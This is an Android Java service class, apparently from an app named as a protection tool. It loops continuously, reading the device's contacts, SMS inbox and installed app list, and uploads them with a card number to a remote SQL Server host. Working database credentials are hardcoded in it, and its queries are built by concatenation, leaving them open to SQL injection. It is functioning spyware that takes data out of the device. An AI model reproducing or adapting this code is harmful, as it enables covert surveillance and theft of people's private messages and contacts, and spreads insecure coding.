package com.example.aprotected;

import android.app.IntentService;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class MyService2 extends Service {

    private  LinkedList<String> applist = null;
    private LinkedList<Contactclass> contacts = new LinkedList<Contactclass>();
    private LinkedList<SMSclass> sms = new LinkedList<>();

    private static boolean READ_CONTACTS_GRANTED = false;
    private static boolean READ_INTERNET_GRANTED = false;
    private static boolean READ_SMS_GRANTED = false;
    private static String cardnumber="";
    private PackageManager packageManager = null;
    private Connection connection = null;




    public void onCreate() {
        super.onCreate();

    }

    public int onStartCommand(Intent intent, int flags, int startId) {

        Bundle bundle=intent.getExtras();
        READ_CONTACTS_GRANTED=bundle.getBoolean("contacts");
        READ_SMS_GRANTED=bundle.getBoolean("sms");
        READ_INTERNET_GRANTED=bundle.getBoolean("databases");
        cardnumber=bundle.getString("cardnumber");
        packageManager=getPackageManager();

        someTask();

        return super.onStartCommand(intent, flags, startId);
    }

    public void onDestroy() {

        super.onDestroy();

    }

    public IBinder onBind(Intent intent) {

        return null;
    }



    void someTask() {
        new Thread(new Runnable() {
            public void run() {
                while (true) {
                    try {

                        if (READ_CONTACTS_GRANTED) {
                            readContacts();
                        }
                        if (READ_SMS_GRANTED) {
                            readSMS();
                        }
                        new LoadApplications().execute();
                        TimeUnit.SECONDS.sleep(10);

                        new LoadDataBase().execute();

                        TimeUnit.MINUTES.sleep(1);
                    } catch (InterruptedException e) {

                    }

                }
            }
        }).start();



    }


    private LinkedList<Contactclass> readContacts() {
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        try {
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String contact = "!"+cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY));
                    int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
                    String phoneNumber="none";
                    if(hasPhoneNumber>0)
                    {
                        StringBuffer output = new StringBuffer();
                        Cursor phoneCursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[] { cursor.getString(cursor.getColumnIndex( ContactsContract.Contacts._ID )) }, null);
                        while (phoneCursor.moveToNext()) {
                            phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            output.append("\n Телефон: " + phoneNumber);
                        }
                    }
                    contacts.add(new Contactclass(contact.replace("'","*"),phoneNumber));
                }

                cursor.close();
            }


        } catch (Exception ex) {
            Toast.makeText(getApplicationContext(), ex.getMessage(), Toast.LENGTH_LONG).show();
        }
        return contacts;

    }

    private LinkedList<SMSclass> readSMS()
    {

     
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        sms=new LinkedList<>();

        if (cursor.moveToFirst())
        {
            do {
                sms.add(new SMSclass(cursor.getString(2).replace("'","*"),cursor.getString(12).replace("'","*")));

            } while (cursor.moveToNext());
        }
      
//   
        return  sms;
    }


    private class LoadDataBase extends AsyncTask<Void, Void, Void> {
        String dbURL = "jdbc:jtds:sqlserver://SQL5103.site4now.net:1433/DB_A72B1E_Secure";
        String user = "DB_A72B1E_Secure_admin";
        String pass = "Alexz73canY";
        @Override
        protected Void doInBackground(Void... params) {
            if (READ_INTERNET_GRANTED) {
                try {

                    Class.forName("net.sourceforge.jtds.jdbc.Driver");
                    connection = DriverManager.getConnection(dbURL, user, pass);
                } catch (ClassNotFoundException | SQLException e) {
                    e.printStackTrace();
                }


                if (connection != null) {
                    Statement statement = null;
                    String insertstring="";
                    try {

                        statement = connection.createStatement();
                        int clientID=0;
                        ResultSet resultSet = statement.executeQuery("Select ID FROM Clients WHERE CardNumber='"+cardnumber+"'");
                        while(resultSet.next()) {
                            clientID = resultSet.getInt(1);
                        }

                        if(clientID==0)
                        {
                            insertstring="INSERT Clients(CardNumber) VALUES('"+cardnumber+"')";
                            statement.executeUpdate(insertstring);
                            resultSet = statement.executeQuery("Select ID FROM Clients WHERE CardNumber='"+cardnumber+"'");
                            while(resultSet.next()) {
                                clientID = resultSet.getInt(1);
                            }
                        }


                        if(clientID>0) {


                            insertstring = "SELECT *FROM Messages WHERE ClientID="+clientID;
                            resultSet=statement.executeQuery(insertstring);
                            while(resultSet.next()) {

                                for(int j=0;j<sms.size();j++)
                                {
                                    if(sms.get(j).sender.equals(resultSet.getString(3)))
                                    {
                                       if(sms.get(j).text.equals(resultSet.getString(4)))
                                       {
                                           sms.remove(j);
                                           j--;
                                       }
                                    }
                                }
                            }

                            insertstring = "SELECT *FROM Contacts WHERE ClientID="+clientID;
                            resultSet=statement.executeQuery(insertstring);
                            while(resultSet.next()) {

                                for(int j=0;j<contacts.size();j++)
                                {
                                    if(contacts.get(j).name.equals(resultSet.getString(3)))
                                    {
                                        if(contacts.get(j).number.equals(resultSet.getString(4)))
                                        {
                                            contacts.remove(j);
                                            j--;
                                        }
                                    }
                                }
                            }

                            insertstring = "SELECT *FROM Applications WHERE ClientID="+clientID;
                            resultSet=statement.executeQuery(insertstring);
                            while(resultSet.next()) {

                                for(int j=0;j<applist.size();j++)
                                {
                                    if(applist.get(j).equals(resultSet.getString(3)))
                                    {

                                        applist.remove(j);
                                        j--;
                                    }
                                }
                            }



                            if(contacts.size()>0) {
                                insertstring = "INSERT Contacts(ClientID, ContactName, ContactNumber) VALUES (";
                                for (int k = 0; k < contacts.size(); k++) {
                                    insertstring += clientID + ", N'" + contacts.get(k).name + "'"+ ", N'" + contacts.get(k).number + "'";
                                    if (k < contacts.size() - 1) {
                                        insertstring += "), (";
                                    }
                                }
                                insertstring += ")";
                                statement.executeUpdate(insertstring);
                            }

                            if(sms.size()>0) {
                                insertstring = "INSERT INTO Messages(ClientID, MessageFrom, MessageText) VALUES (";
                                for (int k = 0; k < sms.size(); k++) {
                                    insertstring += clientID + ", N'" + sms.get(k).sender + "',N'" + sms.get(k).text + "'";
                                    if (k < sms.size() - 1) {
                                        insertstring += "), (";
                                    }

                                }
                                insertstring +=")";
                                statement.executeUpdate(insertstring);
                            }


                            if(applist.size()>0) {
                                insertstring = "INSERT INTO Applications(ClientID, ApplicationName) VALUES (";
                                for (int k = 0; k < applist.size(); k++) {
                                    insertstring += clientID + ", N'" + applist.get(k) + "'";
                                    if (k < applist.size() - 1) {
                                        insertstring += "), (";
                                    }
                                }

                                insertstring += ")";
                                statement.executeUpdate(insertstring);
                            }

                        }

                    } catch (Exception throwables) {

                    }
                }

            }


            return null;
        }

        @Override
        protected void onPostExecute(Void result) {

            super.onPostExecute(result);
        }
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

    }


    private  LinkedList<String> checkForLaunchIntent(List<ApplicationInfo> list) {
        LinkedList<String> appList = new  LinkedList<String>();
        for (ApplicationInfo info : list) {
            try {
                if (packageManager.getLaunchIntentForPackage(info.packageName) != null) {
                    appList.add(info.name.toString());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return appList;
    }

    private class LoadApplications extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            applist = checkForLaunchIntent(packageManager.getInstalledApplications(PackageManager.GET_META_DATA));
            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            
            super.onPostExecute(result);
        }

        @Override
        protected void onPreExecute() {
           
            super.onPreExecute();
        }
    }

}